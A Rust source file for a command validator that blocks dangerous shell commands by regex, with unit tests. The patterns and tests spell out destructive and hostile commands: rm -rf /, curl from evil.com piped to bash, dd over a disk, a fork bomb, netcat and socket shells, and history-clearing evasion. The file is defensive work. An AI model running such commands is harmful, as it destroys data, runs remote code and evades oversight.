use std::sync::{Arc, RwLock};

use regex::Regex;

use crate::ancient::NegativeSpaceArchitecture;

#[derive(Debug, Clone)]
pub struct ValidationResult {
    pub allowed: bool,
    pub reason: Option<String>,
    pub risk_score: f64,
    pub matched_patterns: Vec<String>,
}

pub struct CommandValidator {
    blocked_patterns: Vec<(Regex, &'static str)>,
    negative_space: Arc<RwLock<NegativeSpaceArchitecture>>,
}

impl CommandValidator {
    pub fn new(negative_space: Arc<RwLock<NegativeSpaceArchitecture>>) -> Self {
        Self {
            blocked_patterns: Self::build_blocked_patterns(),
            negative_space,
        }
    }

    fn build_blocked_patterns() -> Vec<(Regex, &'static str)> {
        let patterns = vec![
            (r"rm\s+(-[rf]+\s+)*(/|/\*|~)", "Dangerous recursive delete"),
            (
                r"sudo\s+(rm|dd|mkfs|fdisk)",
                "Privileged destructive command",
            ),
            (r"curl.*\|\s*(ba)?sh", "Remote code execution via curl pipe"),
            (r"wget.*\|\s*(ba)?sh", "Remote code execution via wget pipe"),
            (r"eval\s+\$", "Dynamic code evaluation"),
            (r">\s*/dev/sd[a-z]", "Direct disk write"),
            (r"dd\s+.*of=/dev/", "Direct disk overwrite"),
            (r"mkfs\.", "Filesystem formatting"),
            (r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:", "Fork bomb"),
            (r"\bchmod\s+777\s+/", "Dangerous root permission change"),
            (r"\bchown\s+-R\s+.*\s+/", "Recursive root ownership change"),
            (r">\s*/etc/(passwd|shadow|sudoers)", "System file overwrite"),
            (r"nc\s+-[el]", "Netcat listener/backdoor"),
            (r"python.*-c.*import\s+socket", "Python socket shell"),
            (r"perl.*-e.*socket", "Perl socket shell"),
            (r"base64\s+-d.*\|\s*(ba)?sh", "Base64 encoded execution"),
            (r"history\s+-c", "History clearing (evasion)"),
            (r"unset\s+HISTFILE", "History file unsetting (evasion)"),
            (r"export\s+HISTSIZE=0", "History disabling (evasion)"),
        ];

        patterns
            .into_iter()
            .filter_map(|(pattern, desc)| Regex::new(pattern).ok().map(|r| (r, desc)))
            .collect()
    }

    pub fn validate(&self, command: &str) -> ValidationResult {
        let mut matched_patterns = Vec::new();
        let mut highest_risk: f64 = 0.0;
        let mut block_reason: Option<String> = None;

        for (pattern, description) in &self.blocked_patterns {
            if pattern.is_match(command) {
                matched_patterns.push(description.to_string());
                highest_risk = 1.0;
                block_reason = Some(description.to_string());
            }
        }

        if !matched_patterns.is_empty() {
            return ValidationResult {
                allowed: false,
                reason: block_reason,
                risk_score: highest_risk,
                matched_patterns,
            };
        }

        let ns_check = self
            .negative_space
            .write()
            .map(|mut ns| ns.check_action(command, &std::collections::HashMap::new()))
            .unwrap_or_else(|_| crate::ancient::NegativeSpaceCheckResult::default_allowed());

        if !ns_check.allowed {
            return ValidationResult {
                allowed: false,
                reason: ns_check
                    .violations
                    .first()
                    .map(|v| v.prohibition_id.clone()),
                risk_score: ns_check.risk_score,
                matched_patterns: ns_check
                    .violations
                    .iter()
                    .map(|v| format!("{}: {}", v.prohibition_id, v.action_taken))
                    .collect(),
            };
        }

        ValidationResult {
            allowed: true,
            reason: None,
            risk_score: ns_check.risk_score,
            matched_patterns: Vec::new(),
        }
    }

    pub fn add_blocked_pattern(&mut self, pattern: &str, description: &'static str) {
        if let Ok(regex) = Regex::new(pattern) {
            self.blocked_patterns.push((regex, description));
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn create_validator() -> CommandValidator {
        CommandValidator::new(Arc::new(RwLock::new(NegativeSpaceArchitecture::new())))
    }

    #[test]
    fn test_safe_commands() {
        let validator = create_validator();

        assert!(validator.validate("ls -la").allowed);
        assert!(validator.validate("cat file.txt").allowed);
        assert!(validator.validate("git status").allowed);
        assert!(validator.validate("cargo build").allowed);
    }

    #[test]
    fn test_dangerous_rm() {
        let validator = create_validator();

        assert!(!validator.validate("rm -rf /").allowed);
        assert!(!validator.validate("rm -rf ~").allowed);
        assert!(!validator.validate("rm -rf /*").allowed);
    }

    #[test]
    fn test_curl_pipe_bash() {
        let validator = create_validator();

        assert!(
            !validator
                .validate("curl http://evil.com/script.sh | bash")
                .allowed
        );
        assert!(!validator.validate("curl -s http://x.com | sh").allowed);
    }

    #[test]
    fn test_sudo_dangerous() {
        let validator = create_validator();

        assert!(!validator.validate("sudo rm -rf /").allowed);
        assert!(
            !validator
                .validate("sudo dd if=/dev/zero of=/dev/sda")
                .allowed
        );
    }

    #[test]
    fn test_fork_bomb() {
        let validator = create_validator();

        assert!(!validator.validate(":(){ :|:& };:").allowed);
    }

    #[test]
    fn test_history_evasion() {
        let validator = create_validator();

        assert!(!validator.validate("history -c").allowed);
        assert!(!validator.validate("unset HISTFILE").allowed);
    }
}
